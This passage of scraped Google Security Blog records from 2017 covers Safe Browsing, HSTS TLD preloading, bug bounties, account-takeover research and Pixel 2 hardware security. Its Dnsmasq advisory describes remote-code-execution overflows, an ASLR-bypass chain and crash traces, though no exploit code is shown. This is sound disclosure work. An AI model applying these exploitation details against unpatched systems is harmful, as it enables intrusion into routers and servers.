up to date.    This protective information that we generate&#8212;a curated list of places that are dangerous for people and their devices&#8212;is used across many of our products. It helps keep search results safe and keep ads free from badness; it&#8217;s integral to Google Play Protect and keeps you safe on Android; and it helps Gmail shield you from malicious messages.      And Safe Browsing doesn&#8217;t protect only Google&#8217;s products. For many years, Safari and Firefox have protected their users with Safe Browsing as well. If you use an up-to-date version of Chrome, Firefox or Safari, you&#8217;re protected by default. Safe Browsing is also used widely by  web developers  and  app developers  ( including Snapchat ), who integrate our protections by checking URLs before they&#8217;re presented to their users.       Protecting more people with fewer bits       In the days when web browsers were used only on personal computers, we didn&#8217;t worry much about the amount of data Safe Browsing sent over the internet to keep your browser current. Mobile devices changed all that: Slow connections, expensive mobile data plans, and scarce battery capacity became important new considerations.    So over the last few years, we&#8217;ve rethought how Safe Browsing delivers data. We built new technologies to make its data as compact as possible: We only send the information that&#8217;s most protective to a given device, and we make sure this data is compressed as tightly as possible. (All this work benefits desktop browsers, too!)    We initially introduced our new mobile-optimized method in  late 2015 with Chrome on Android,  made it  more broadly available in mid-2016 , when we also started a ctively encouraging Android developers  to integrate it. With the release of iOS 10 in September 2016, Safari began using our new, efficient Safe Browsing update technology, giving iOS users a protection boost.     Safe Browsing in an AI-first world       The internet is at the start of another major shift. Safe Browsing has already been  using machine learning  for  many years  to detect  much badness  of  many kinds . We&#8217;re continually evaluating and integrating cutting-edge new approaches to improve Safe Browsing.    Protecting all users across all their platforms makes the internet safer for everyone. Wherever the future of the internet takes us, Safe Browsing will be there, continuing to evolve, expand, and protect people wherever they are.                                   Posted by Stephan Somogyi, Safe Browsing Emeritus and Allison Miller, Security & Privacy  [Cross-posted from The Keyword]  In 2007, we launched Safe Browsing, one of Google’s earliest anti-malware efforts. To keep our users safe, we’d show them a warning before they visited a site that might’ve harmed their computers.   Computing has evolved a bit in the last decade, though. Smartphones created a more mobile internet, and now AI is increasingly changing how the world interacts with it. Safe Browsing also had to evolve to effectively protect users.  And it has: In May 2016, we announced that Safe Browsing was protecting more than 2 billion devices from badness on the internet. Today we’re announcing that Safe Browsing has crossed the threshold to 3 billion devices. We’re sharing a bit more about how we got here, and where we’re going.  What is Safe Browsing?  You may not know Safe Browsing by name, since most of the time we’re invisibly protecting you, without getting in the way. But you may have seen a warning like this at some point:   This notification is one of the visible parts of Safe Browsing, a collection of Google technologies that hunt badness—typically websites that deceive users—on the internet. We identify sites that might try to phish you, or sites that install malware or other undesirable software. The systems that make up Safe Browsing work together to identify, analyze and continuously keep Safe Browsing’s knowledge of the harmful parts of the internet up to date.  This protective information that we generate—a curated list of places that are dangerous for people and their devices—is used across many of our products. It helps keep search results safe and keep ads free from badness; it’s integral to Google Play Protect and keeps you safe on Android; and it helps Gmail shield you from malicious messages.  And Safe Browsing doesn’t protect only Google’s products. For many years, Safari and Firefox have protected their users with Safe Browsing as well. If you use an up-to-date version of Chrome, Firefox or Safari, you’re protected by default. Safe Browsing is also used widely by web developers and app developers (including Snapchat), who integrate our protections by checking URLs before they’re presented to their users.  Protecting more people with fewer bits  In the days when web browsers were used only on personal computers, we didn’t worry much about the amount of data Safe Browsing sent over the internet to keep your browser current. Mobile devices changed all that: Slow connections, expensive mobile data plans, and scarce battery capacity became important new considerations.  So over the last few years, we’ve rethought how Safe Browsing delivers data. We built new technologies to make its data as compact as possible: We only send the information that’s most protective to a given device, and we make sure this data is compressed as tightly as possible. (All this work benefits desktop browsers, too!)  We initially introduced our new mobile-optimized method in late 2015 with Chrome on Android, made it more broadly available in mid-2016, when we also started actively encouraging Android developers to integrate it. With the release of iOS 10 in September 2016, Safari began using our new, efficient Safe Browsing update technology, giving iOS users a protection boost.  Safe Browsing in an AI-first world  The internet is at the start of another major shift. Safe Browsing has already been using machine learning for many years to detect much badness of many kinds. We’re continually evaluating and integrating cutting-edge new approaches to improve Safe Browsing.  Protecting all users across all their platforms makes the internet safer for everyone. Wherever the future of the internet takes us, Safe Browsing will be there, continuing to evolve, expand, and protect people wherever they are.     ", "date": "September 11, 2017"},
{"website": "Google-Security", "title": "\nBroadening HSTS to secure more of the Web\n", "author": ["Posted by Ben McIlwain, Google Registry"], "link": "https://security.googleblog.com/2017/09/broadening-hsts-to-secure-more-of-web.html", "abstract": "                             Posted by Ben McIlwain, Google Registry   The security of the Web is of the utmost importance to Google. One of the most powerful tools in the Web security toolbox is ensuring that  connections to websites are encrypted using HTTPS , which prevents Web traffic from being intercepted, altered, or misdirected in transit. We have taken many actions to make the use of HTTPS more widespread, both within Google and on the larger Internet.    We began in 2010 by  defaulting to HTTPS for Gmail  and starting the transition to encrypted search by default. In 2014, we started encouraging other websites to use HTTPS by  giving secure sites a ranking boost in Google Search . In 2016, we became a platinum sponsor of  Let&#8217;s Encrypt , a service that provides simple and free SSL certificates. Earlier this year we announced that Chrome will start  displaying warnings on insecure sites , and we recently introduced  fully managed SSL certificates in App Engine . And today we&#8217;re proud to announce that we are beginning to use another tool in our toolbox, the  HTTPS Strict Transport Security (HSTS) preload list , in a new and more impactful way.    The HSTS preload list is built in to all major browsers (Chrome, Firefox, Safari, Internet Explorer/Edge, and Opera). It consists of a list of hostnames for which browsers automatically enforce HTTPS-secured connections. For example, gmail.com is on the list, which means that the aforementioned browsers will never make insecure connections to Gmail; if the user types  http://gmail.com , the browser first changes it to  https://gmail.com  before sending the request. This provides greater security because the browser never loads an http-to-https redirect page, which could be intercepted.    The HSTS preload list can contain individual domains or subdomains and even  top-level domains  (TLDs), which are added through the  HSTS website . The TLD is the last part of the domain name, e.g., .com, .net, or .org.  Google operates 45 TLDs , including .google, .how, and .soy. In 2015 we created the first secure TLD when we added .google to the HSTS preload list, and we are now rolling out HSTS for a larger number of our TLDs, starting with .foo and .dev.    The use of TLD-level HSTS allows such namespaces to be secure by default. Registrants receive guaranteed protection for themselves and their users simply by choosing a secure TLD for their website and configuring an SSL certificate, without having to add individual domains or subdomains to the HSTS preload list. Moreover, since it typically takes months between adding a domain name to the list and browser upgrades reaching a majority of users, using an already-secured TLD provides immediate protection rather than eventual protection. Adding an entire TLD to the HSTS preload list is also more efficient, as it secures all domains under that TLD without the overhead of having to include all those domains individually.    We hope to make some of these secure TLDs available for registration soon, and would like to see TLD-wide HSTS become the security standard for new TLDs.     Updated 2017-10-06 : To clear up some confusion in the responses to this post, we are not rolling out HSTS to Google's previously launched open TLDs (.how, .soy, and .みんな).                                   Posted by Ben McIlwain, Google Registry The security of the Web is of the utmost importance to Google. One of the most powerful tools in the Web security toolbox is ensuring that connections to websites are encrypted using HTTPS, which prevents Web traffic from being intercepted, altered, or misdirected in transit. We have taken many actions to make the use of HTTPS more widespread, both within Google and on the larger Internet.  We began in 2010 by defaulting to HTTPS for Gmail and starting the transition to encrypted search by default. In 2014, we started encouraging other websites to use HTTPS by giving secure sites a ranking boost in Google Search. In 2016, we became a platinum sponsor of Let’s Encrypt, a service that provides simple and free SSL certificates. Earlier this year we announced that Chrome will start displaying warnings on insecure sites, and we recently introduced fully managed SSL certificates in App Engine. And today we’re proud to announce that we are beginning to use another tool in our toolbox, the HTTPS Strict Transport Security (HSTS) preload list, in a new and more impactful way.  The HSTS preload list is built in to all major browsers (Chrome, Firefox, Safari, Internet Explorer/Edge, and Opera). It consists of a list of hostnames for which browsers automatically enforce HTTPS-secured connections. For example, gmail.com is on the list, which means that the aforementioned browsers will never make insecure connections to Gmail; if the user types http://gmail.com, the browser first changes it to https://gmail.com before sending the request. This provides greater security because the browser never loads an http-to-https redirect page, which could be intercepted.  The HSTS preload list can contain individual domains or subdomains and even top-level domains (TLDs), which are added through the HSTS website. The TLD is the last part of the domain name, e.g., .com, .net, or .org. Google operates 45 TLDs, including .google, .how, and .soy. In 2015 we created the first secure TLD when we added .google to the HSTS preload list, and we are now rolling out HSTS for a larger number of our TLDs, starting with .foo and .dev.  The use of TLD-level HSTS allows such namespaces to be secure by default. Registrants receive guaranteed protection for themselves and their users simply by choosing a secure TLD for their website and configuring an SSL certificate, without having to add individual domains or subdomains to the HSTS preload list. Moreover, since it typically takes months between adding a domain name to the list and browser upgrades reaching a majority of users, using an already-secured TLD provides immediate protection rather than eventual protection. Adding an entire TLD to the HSTS preload list is also more efficient, as it secures all domains under that TLD without the overhead of having to include all those domains individually.  We hope to make some of these secure TLDs available for registration soon, and would like to see TLD-wide HSTS become the security standard for new TLDs.  Updated 2017-10-06: To clear up some confusion in the responses to this post, we are not rolling out HSTS to Google's previously launched open TLDs (.how, .soy, and .みんな).     ", "date": "September 27, 2017"},
{"website": "Google-Security", "title": "\nBehind the Masq: Yet more DNS, and DHCP, vulnerabilities\n", "author": ["Posted by Fermin J. Serna, Staff Software Engineer, Matt Linton, Senior Security Engineer and Kevin Stadmeyer, Technical Program Manager"], "link": "https://security.googleblog.com/2017/10/behind-masq-yet-more-dns-and-dhcp.html", "abstract": "                             Posted by Fermin J. Serna, Staff Software Engineer, Matt Linton, Senior Security Engineer and Kevin Stadmeyer, Technical Program Manager     Our team has previously posted about  DNS vulnerabilities and exploits . Lately, we&#8217;ve been busy reviewing the security of another DNS software package:  Dnsmasq . We are writing this to disclose the issues we found and to publicize the patches in an effort to increase their uptake.    Dnsmasq provides functionality for serving DNS, DHCP, router advertisements and network boot. This software is commonly installed in systems as varied as desktop Linux distributions (like Ubuntu), home routers, and IoT devices. Dnsmasq is widely used both on the open  internet  and internally in private networks.    We discovered seven distinct issues (listed below) over the course of our regular internal security assessments. Once we determined the severity of these issues, we worked to investigate their impact and exploitability and then produced internal proofs of concept for each of them. We also worked with the maintainer of Dnsmasq, Simon Kelley, to produce appropriate patches and mitigate the issue.    These patches have been upstreamed and are now committed to the  project&#8217;s git repository . In addition to these patches we have also submitted another patch which will run Dnsmasq under  seccomp-bpf  to allow for additional sandboxing. This patch has been submitted to the DNSmasq project for review and we have also made it available  here  for those who wish to integrate it into an existing install (after testing, of course!). We believe the adoption of this patch will increase the security of DNSMasq installations.    We would like to thank Simon Kelley for his help in patching these bugs in the core Dnsmasq codebase. Users who have deployed the  latest version  of Dnsmasq (2.78) will be protected from the attacks discovered here. Android partners have received this patch as well and it will be included in Android's monthly security update for October. Kubernetes versions 1.5.8, 1.6.11, 1.7.7, and 1.8.0 have been released with a patched DNS pod. Other affected Google services have been updated.    During our review, the team found three potential remote code executions, one information leak, and three denial of service vulnerabilities affecting the latest version at the project git server as of September 5th 2017.                        CVE        Impact        Vector        Notes        PoC           CVE-2017-14491        RCE        DNS        Heap based overflow (2 bytes). Before 2.76 and    this commit    overflow was unrestricted.         PoC   ,    instructions    and    ASAN report            CVE-2017-14492        RCE        DHCP        Heap based overflow.         PoC   ,    instructions    and    ASAN report            CVE-2017-14493        RCE        DHCP        Stack Based overflow.         PoC   ,    instructions    and    ASAN report            CVE-2017-14494        Information Leak        DHCP        Can help bypass ASLR.          PoC    and    Instructions            CVE-2017-14495        OOM/DoS        DNS        Lack of free()    here   .         PoC    and &nbsp;   instructions               CVE-2017-14496        DoS        DNS        Invalid boundary checks    here   . Integer underflow leading to a huge memcpy.         PoC   ,    instructions    and    ASAN report            CVE-2017-13704        DoS        DNS        Bug collision with    CVE-2017-13704               It is worth expanding on some of these:       CVE-2017-14491 is a DNS-based vulnerability that affects both directly exposed and internal network setups. Although the latest git version only allows a 2-byte overflow, this could be exploited based on previous research. Before version 2.76 and this commit the overflow is unrestricted.&nbsp;    ==1159==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x62200001dd0b at pc 0x0000005105e7 bp 0x7fff6165b9b0 sp0x7fff6165b9a8    WRITE of size 1 at 0x62200001dd0b thread T0    &nbsp; #0 0x5105e6 in add_resource_record    /test/dnsmasq/src/rfc1035.c:1141:7    &nbsp; #1 0x5127c8 in answer_request /test/dnsmasq/src/rfc1035.c:1428:11    &nbsp; #2 0x534578 in receive_query /test/dnsmasq/src/forward.c:1439:11    &nbsp; #3 0x548486 in check_dns_listeners&nbsp;    /test/dnsmasq/src/dnsmasq.c:1565:2    &nbsp; #4 0x5448b6 in main /test/dnsmasq/src/dnsmasq.c:1044:7    &nbsp; #5 0x7fdf4b3972b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)    &nbsp; #6 0x41cbe9 in _start (/test/dnsmasq/src/dnsmasq+0x41cbe9)            CVE-2017-14493 is a trivial-to-exploit DHCP-based, stack-based buffer overflow vulnerability. In combination with CVE-2017-14494 acting as an info leak, an attacker could bypass ASLR and gain remote code execution.      dnsmasq[15714]: segfault at 1337deadbeef ip  00001337deadbeef  sp 00007fff1b66fd10 error 14 in libnss_files-2.24.so[7f7cfbacb000+a000]           Android is affected by CVE-2017-14496 when the attacker is local or tethered directly to the device&#8212;the service itself is sandboxed so the risk is reduced. Android partners received patches on 5 September 2017 and devices with a  2017-10-01 security patch level &nbsp;or later address this issue.      Proofs of concept are provided so you can check if you are affected by these issues, and verify any mitigations you may deploy.                We would like to thank the following people for discovering, investigating impact/exploitability and developing PoCs: Felix Wilhelm, Fermin J. Serna, Gabriel Campana, Kevin Hamacher, Ron Bowes and Gynvael Coldwind of the Google Security Team.                                     Posted by Fermin J. Serna, Staff Software Engineer, Matt Linton, Senior Security Engineer and Kevin Stadmeyer, Technical Program Manager  Our team has previously posted about DNS vulnerabilities and exploits. Lately, we’ve been busy reviewing the security of another DNS software package: Dnsmasq. We are writing this to disclose the issues we found and to publicize the patches in an effort to increase their uptake.  Dnsmasq provides functionality for serving DNS, DHCP, router advertisements and network boot. This software is commonly installed in systems as varied as desktop Linux distributions (like Ubuntu), home routers, and IoT devices. Dnsmasq is widely used both on the open internet and internally in private networks.  We discovered seven distinct issues (listed below) over the course of our regular internal security assessments. Once we determined the severity of these issues, we worked to investigate their impact and exploitability and then produced internal proofs of concept for each of them. We also worked with the maintainer of Dnsmasq, Simon Kelley, to produce appropriate patches and mitigate the issue.  These patches have been upstreamed and are now committed to the project’s git repository. In addition to these patches we have also submitted another patch which will run Dnsmasq under seccomp-bpf to allow for additional sandboxing. This patch has been submitted to the DNSmasq project for review and we have also made it available here for those who wish to integrate it into an existing install (after testing, of course!). We believe the adoption of this patch will increase the security of DNSMasq installations.  We would like to thank Simon Kelley for his help in patching these bugs in the core Dnsmasq codebase. Users who have deployed the latest version of Dnsmasq (2.78) will be protected from the attacks discovered here. Android partners have received this patch as well and it will be included in Android's monthly security update for October. Kubernetes versions 1.5.8, 1.6.11, 1.7.7, and 1.8.0 have been released with a patched DNS pod. Other affected Google services have been updated.  During our review, the team found three potential remote code executions, one information leak, and three denial of service vulnerabilities affecting the latest version at the project git server as of September 5th 2017.    CVE  Impact  Vector  Notes  PoC   CVE-2017-14491  RCE  DNS  Heap based overflow (2 bytes). Before 2.76 and this commit overflow was unrestricted.  PoC, instructions and ASAN report   CVE-2017-14492  RCE  DHCP  Heap based overflow.  PoC, instructions and ASAN report   CVE-2017-14493  RCE  DHCP  Stack Based overflow.  PoC, instructions and ASAN report   CVE-2017-14494  Information Leak  DHCP  Can help bypass ASLR.   PoC and Instructions   CVE-2017-14495  OOM/DoS  DNS  Lack of free() here.  PoC and  instructions    CVE-2017-14496  DoS  DNS  Invalid boundary checks here. Integer underflow leading to a huge memcpy.  PoC, instructions and ASAN report   CVE-2017-13704  DoS  DNS  Bug collision with CVE-2017-13704    It is worth expanding on some of these:   CVE-2017-14491 is a DNS-based vulnerability that affects both directly exposed and internal network setups. Although the latest git version only allows a 2-byte overflow, this could be exploited based on previous research. Before version 2.76 and this commit the overflow is unrestricted.   ==1159==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x62200001dd0b at pc 0x0000005105e7 bp 0x7fff6165b9b0 sp0x7fff6165b9a8  WRITE of size 1 at 0x62200001dd0b thread T0    #0 0x5105e6 in add_resource_record  /test/dnsmasq/src/rfc1035.c:1141:7    #1 0x5127c8 in answer_request /test/dnsmasq/src/rfc1035.c:1428:11    #2 0x534578 in receive_query /test/dnsmasq/src/forward.c:1439:11    #3 0x548486 in check_dns_listeners   /test/dnsmasq/src/dnsmasq.c:1565:2    #4 0x5448b6 in main /test/dnsmasq/src/dnsmasq.c:1044:7    #5 0x7fdf4b3972b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)    #6 0x41cbe9 in _start (/test/dnsmasq/src/dnsmasq+0x41cbe9)     CVE-2017-14493 is a trivial-to-exploit DHCP-based, stack-based buffer overflow vulnerability. In combination with CVE-2017-14494 acting as an info leak, an attacker could bypass ASLR and gain remote code execution.   dnsmasq[15714]: segfault at 1337deadbeef ip 00001337deadbeef sp 00007fff1b66fd10 error 14 in libnss_files-2.24.so[7f7cfbacb000+a000]     Android is affected by CVE-2017-14496 when the attacker is local or tethered directly to the device—the service itself is sandboxed so the risk is reduced. Android partners received patches on 5 September 2017 and devices with a 2017-10-01 security patch level or later address this issue.   Proofs of concept are provided so you can check if you are affected by these issues, and verify any mitigations you may deploy.       We would like to thank the following people for discovering, investigating impact/exploitability and developing PoCs: Felix Wilhelm, Fermin J. Serna, Gabriel Campana, Kevin Hamacher, Ron Bowes and Gynvael Coldwind of the Google Security Team.     ", "date": "October 2, 2017"},
{"website": "Google-Security", "title": "\nIntroducing the Google Play Security Reward Program\n", "author": ["Posted by Renu Chaudhary, Android Security and Rahul Mishra, Program Manager"], "link": "https://security.googleblog.com/2017/10/introducing-google-play-security-reward.html", "abstract": "                             Posted by Renu Chaudhary, Android Security and Rahul Mishra, Program Manager     We have long enjoyed a close relationship with the security research community. To recognize the valuable external contributions that help us keep our users safe online, we maintain reward programs for  Google-developed websites and apps , for  Chrome and Chrome OS , and for  the latest version of Android running on Pixel devices . These programs have been a success and helped uncover hundreds of vulnerabilities, while also paying out millions of dollars to participating security researchers and research teams.    Today, we&#8217;re introducing the  Google Play Security Reward Program  to incentivize security research into popular Android apps available on Google Play. Through our collaboration with independent bug bounty platform,  HackerOne , we&#8217;ll enable security researchers to submit an eligible vulnerability to participating developers, who are listed in the program rules. After the vulnerability is addressed, the eligible researcher submits a report to the Play Security Reward Program to receive a monetary reward from Google Play.    With the ongoing success of our other reward programs, we invite developers and the research community to work together with us on proactively improving the security of some of the most popular Android apps on Google Play.    The program is limited to a select number of developers at this time to get initial feedback. Developers can contact their Google Play partner manager to show interest. All developers will benefit when bugs are discovered because we will scan all apps for them and deliver security recommendations to the developers of any affected apps. For more information, visit the  Play Security Reward Program  on HackerOne.                                   Posted by Renu Chaudhary, Android Security and Rahul Mishra, Program Manager  We have long enjoyed a close relationship with the security research community. To recognize the valuable external contributions that help us keep our users safe online, we maintain reward programs for Google-developed websites and apps, for Chrome and Chrome OS, and for the latest version of Android running on Pixel devices. These programs have been a success and helped uncover hundreds of vulnerabilities, while also paying out millions of dollars to participating security researchers and research teams.  Today, we’re introducing the Google Play Security Reward Program to incentivize security research into popular Android apps available on Google Play. Through our collaboration with independent bug bounty platform, HackerOne, we’ll enable security researchers to submit an eligible vulnerability to participating developers, who are listed in the program rules. After the vulnerability is addressed, the eligible researcher submits a report to the Play Security Reward Program to receive a monetary reward from Google Play.  With the ongoing success of our other reward programs, we invite developers and the research community to work together with us on proactively improving the security of some of the most popular Android apps on Google Play.  The program is limited to a select number of developers at this time to get initial feedback. Developers can contact their Google Play partner manager to show interest. All developers will benefit when bugs are discovered because we will scan all apps for them and deliver security recommendations to the developers of any affected apps. For more information, visit the Play Security Reward Program on HackerOne.     ", "date": "October 19, 2017"},
{"website": "Google-Security", "title": "\nNew research: Understanding the root cause of account takeover\n", "author": ["Posted by Kurt Thomas, Anti-Abuse Research; Angelika Moscicki, Account Security"], "link": "https://security.googleblog.com/2017/11/new-research-understanding-root-cause.html", "abstract": "                             Posted by Kurt Thomas, Anti-Abuse Research; Angelika Moscicki, Account Security   Account takeover, or &#8216;hijacking&#8217;, is unfortunately a common problem for users across the web. More than  15% of Internet users  have reported experiencing the takeover of an email or social networking account. However, despite its familiarity, there is a dearth of research about the root causes of hijacking.    With Google accounts as a case-study, we teamed up with the University of California, Berkeley to better understand how hijackers attempt to take over accounts in the wild. From March 2016 to March 2017, we analyzed several black markets to see how hijackers steal passwords and other sensitive data. We&#8217;ve highlighted some important findings from our investigation below. We presented our study at the  Conference on Computer and Communications Security (CCS)  and it&#8217;s now available  here .    What we learned from the research proved to be immediately useful. We applied its insights to our existing protections and secured 67 million Google accounts before they were abused. We&#8217;re sharing this information publicly so that other online services can better secure their users, and can also supplement their authentication systems with more protections beyond just passwords.              How hijackers steal passwords on the black market     Our research tracked several black markets that traded third-party password breaches, as well as 25,000 blackhat tools used for phishing and keylogging. In total, these sources helped us identify 788,000 credentials stolen via keyloggers, 12 million credentials stolen via phishing, and 3.3 billion credentials exposed by third-party breaches.    While our study focused on Google, these password stealing tactics pose a risk to all account-based online services. In the case of third-party data breaches, 12% of the exposed records included a Gmail address serving as a username and a password; of those passwords, 7% were valid due to reuse. When it comes to phishing and keyloggers, attackers frequently target Google accounts to varying success: 12-25% of attacks yield a valid password.    However, because a password alone is rarely sufficient for gaining access to a Google account, increasingly sophisticated attackers also try to collect sensitive data that we may request when verifying an account holder&#8217;s identity. We found 82% of blackhat phishing tools and 74% of keyloggers attempted to collect a user&#8217;s IP address and location, while another 18% of tools collected phone numbers and device make and model.    By ranking the relative risk to users, we found that phishing posed the greatest threat, followed by keyloggers, and finally third-party breaches.     Protecting our users from account takeover     Our findings were clear: enterprising hijackers are constantly searching for, and are able to find, billions of different platforms&#8217; usernames and passwords on black markets. While we have already applied these insights to our existing protections, our findings are yet another reminder that we must continuously evolve our defenses in order to stay ahead of these bad actors and keep users safe.    For many years, we&#8217;ve applied a &#8216;defense in-depth&#8217; approach to security&#8212;a layered series of constantly improving protections that automatically prevent, detect, and mitigate threats to keep your account safe.     Prevention       A wide variety of safeguards help us to prevent attacks before they ever affect our users. For example, Safe Browsing, which now  protects more than 3 billion devices , alerts users before they visit a dangerous site or when they  click a link to a dangerous site within Gmail . We recently announced the  Advanced Protection program  which provides extra security for users that are at elevated risk of attack.     Detection       We monitor every login attempt to your account for suspicious activity. When there is a sign-in attempt from a device you&#8217;ve never used, or a location you don&#8217;t commonly access your account from, we&#8217;ll require additional information before granting access to your account. For example, if you sign in from a new laptop and you have a phone associated with you account, you will see a prompt&#8212;we&#8217;re calling these dynamic verification challenges&#8212;like this:         This challenge provides two-factor authentication on all suspicious logins, while mitigating the risk of account lockout.     Mitigation     Finally, we regularly scan activity across Google&#8217;s suite of products for suspicious actions performed by hijackers and when we find any, we lock down the affected accounts to prevent any further damage as quickly as possible. We prevent or undo actions we attribute to account takeover, notify the affected user, and help them change their password and re-secure their account into a healthy state.     What you can do     There are some simple steps you can take that make these defenses even stronger. Visit our  Security Checkup  to make sure you have recovery information associated with your account, like a phone number. Allow Chrome to automatically generate passwords for your accounts and save them via  Smart Lock . We&#8217;re constantly working to improve these tools, and our automatic protections, to keep your data safe.                                   Posted by Kurt Thomas, Anti-Abuse Research; Angelika Moscicki, Account Security Account takeover, or ‘hijacking’, is unfortunately a common problem for users across the web. More than 15% of Internet users have reported experiencing the takeover of an email or social networking account. However, despite its familiarity, there is a dearth of research about the root causes of hijacking.  With Google accounts as a case-study, we teamed up with the University of California, Berkeley to better understand how hijackers attempt to take over accounts in the wild. From March 2016 to March 2017, we analyzed several black markets to see how hijackers steal passwords and other sensitive data. We’ve highlighted some important findings from our investigation below. We presented our study at the Conference on Computer and Communications Security (CCS) and it’s now available here.  What we learned from the research proved to be immediately useful. We applied its insights to our existing protections and secured 67 million Google accounts before they were abused. We’re sharing this information publicly so that other online services can better secure their users, and can also supplement their authentication systems with more protections beyond just passwords.     How hijackers steal passwords on the black market  Our research tracked several black markets that traded third-party password breaches, as well as 25,000 blackhat tools used for phishing and keylogging. In total, these sources helped us identify 788,000 credentials stolen via keyloggers, 12 million credentials stolen via phishing, and 3.3 billion credentials exposed by third-party breaches.  While our study focused on Google, these password stealing tactics pose a risk to all account-based online services. In the case of third-party data breaches, 12% of the exposed records included a Gmail address serving as a username and a password; of those passwords, 7% were valid due to reuse. When it comes to phishing and keyloggers, attackers frequently target Google accounts to varying success: 12-25% of attacks yield a valid password.  However, because a password alone is rarely sufficient for gaining access to a Google account, increasingly sophisticated attackers also try to collect sensitive data that we may request when verifying an account holder’s identity. We found 82% of blackhat phishing tools and 74% of keyloggers attempted to collect a user’s IP address and location, while another 18% of tools collected phone numbers and device make and model.  By ranking the relative risk to users, we found that phishing posed the greatest threat, followed by keyloggers, and finally third-party breaches.  Protecting our users from account takeover  Our findings were clear: enterprising hijackers are constantly searching for, and are able to find, billions of different platforms’ usernames and passwords on black markets. While we have already applied these insights to our existing protections, our findings are yet another reminder that we must continuously evolve our defenses in order to stay ahead of these bad actors and keep users safe.  For many years, we’ve applied a ‘defense in-depth’ approach to security—a layered series of constantly improving protections that automatically prevent, detect, and mitigate threats to keep your account safe.  Prevention  A wide variety of safeguards help us to prevent attacks before they ever affect our users. For example, Safe Browsing, which now protects more than 3 billion devices, alerts users before they visit a dangerous site or when they click a link to a dangerous site within Gmail. We recently announced the Advanced Protection program which provides extra security for users that are at elevated risk of attack.  Detection  We monitor every login attempt to your account for suspicious activity. When there is a sign-in attempt from a device you’ve never used, or a location you don’t commonly access your account from, we’ll require additional information before granting access to your account. For example, if you sign in from a new laptop and you have a phone associated with you account, you will see a prompt—we’re calling these dynamic verification challenges—like this:   This challenge provides two-factor authentication on all suspicious logins, while mitigating the risk of account lockout.  Mitigation  Finally, we regularly scan activity across Google’s suite of products for suspicious actions performed by hijackers and when we find any, we lock down the affected accounts to prevent any further damage as quickly as possible. We prevent or undo actions we attribute to account takeover, notify the affected user, and help them change their password and re-secure their account into a healthy state.  What you can do  There are some simple steps you can take that make these defenses even stronger. Visit our Security Checkup to make sure you have recovery information associated with your account, like a phone number. Allow Chrome to automatically generate passwords for your accounts and save them via Smart Lock. We’re constantly working to improve these tools, and our automatic protections, to keep your data safe.     ", "date": "November 9, 2017"},
{"website": "Google-Security", "title": "\nLock it up! New hardware protections for your lock screen with the Google Pixel 2\n", "author": ["Posted by Xiaowen Xin, Android Security Team"], "link": "https://security.googleblog.com/2017/11/lock-it-up-new-hardware-protections-for.html", "abstract": "                             Posted by Xiaowen Xin, Android Security Team   The new Google Pixel 2 ships with a dedicated hardware security module designed to be robust against physical attacks. This hardware module performs lockscreen passcode verification and protects your lock screen better than software alone.    To learn more about the new protections, let&#8217;s first review the role of the lock screen. Enabling a lock screen protects your data, not just against casual thieves, but also against sophisticated attacks. Many Android devices, including all Pixel phones, use your lockscreen passcode to derive the key that is then used to encrypt your data. Before you unlock your phone for the first time after a reboot, an attacker cannot recover the key (and hence your data) without knowing your passcode first. To protect against  brute-force  guessing your passcode, devices running Android 7.0+ verify your attempts in a secure environment that limits how often you can repeatedly guess. Only when the secure environment has successfully verified your passcode does it reveal a device and user-specific secret used to derive the disk encryption key.     Benefits of tamper-resistant hardware       The goal of these protections is to prevent attackers from decrypting your data without knowing your passcode, but the protections are only as strong as the secure environment that verifies the passcode. Performing these types of security-critical operations in tamper-resistant hardware significantly increases the difficulty of attacking it.             Tamper-resistant hardware comes in the form of a discrete chip separate from the System on a Chip (SoC). It includes its own flash, RAM, and other resources inside a single package, so it can fully control its own execution. It can also detect and defend against outside attempts to physically tamper with it.         In particular:     Because it has its own dedicated RAM, it&#8217;s robust against many side-channel information leakage attacks, such as those described in the  TruSpy cache side-channel paper .   Because it has its own dedicated flash, it&#8217;s harder to interfere with its ability to store state persistently.   It loads its operating system and software directly from internal ROM and flash, and it controls all updates to it, so attackers can&#8217;t directly tamper with its software to inject malicious code.   Tamper-resistant hardware is resilient against many physical fault injection techniques including attempts to run outside normal operating conditions, such as wrong voltage, wrong clock speed, or wrong temperature. This is standardized in specifications such as the  SmartCard IC Platform Protection Profile , and tamper-resistant hardware is often certified to these standards.   Tamper-resistant hardware is usually housed in a package that is resistant to physical penetration and designed to resist side channel attacks, including power analysis, timing analysis, and electromagnetic sniffing, such as described in the  SoC it to EM paper .       Security module in Pixel 2          The new Google Pixel 2 ships with a security module built using tamper-resistant hardware that protects your lock screen and your data against many sophisticated hardware attacks.         In addition to all the benefits already mentioned, the security module in Pixel 2 also helps protect you against software-only attacks:       Because it performs very few functions, it has a super small attack surface.   With passcode verification happening in the security module, even in the event of a full compromise elsewhere, the attacker cannot derive your disk encryption key without compromising the security module first.   The security module is designed so that nobody, including Google, can update the passcode verification logic to a weakened version without knowing your passcode first.       Summary              Just like many other Google products, such as  Chromebooks  and  Cloud , Android and Pixel are investing in additional hardware protections to make your device more secure. With the new Google Pixel 2, your data is safer against an entire class of sophisticated hardware attacks.                                       Posted by Xiaowen Xin, Android Security Team The new Google Pixel 2 ships with a dedicated hardware security module designed to be robust against physical attacks. This hardware module performs lockscreen passcode verification and protects your lock screen better than software alone.  To learn more about the new protections, let’s first review the role of the lock screen. Enabling a lock screen protects your data, not just against casual thieves, but also against sophisticated attacks. Many Android devices, including all Pixel phones, use your lockscreen passcode to derive the key that is then used to encrypt your data. Before you unlock your phone for the first time after a reboot, an attacker cannot recover the key (and hence your data) without knowing your passcode first. To protect against brute-force guessing your passcode, devices running Android 7.0+ verify your attempts in a secure environment that limits how often you can repeatedly guess. Only when the secure environment has successfully verified your passcode does it reveal a device and user-specific secret used to derive the disk encryption key.  Benefits of tamper-resistant hardware  The goal of these protections is to prevent attackers from decrypting your data without knowing your passcode, but the protections are only as strong as the secure environment that verifies the passcode. Performing these types of security-critical operations in tamper-resistant hardware significantly increases the difficulty of attacking it.     Tamper-resistant hardware comes in the form of a discrete chip separate from the System on a Chip (SoC). It includes its own flash, RAM, and other resources inside a single package, so it can fully control its own execution. It can also detect and defend against outside attempts to physically tamper with it.    In particular:  Because it has its own dedicated RAM, it’s robust against many side-channel information leakage attacks, such as those described in the 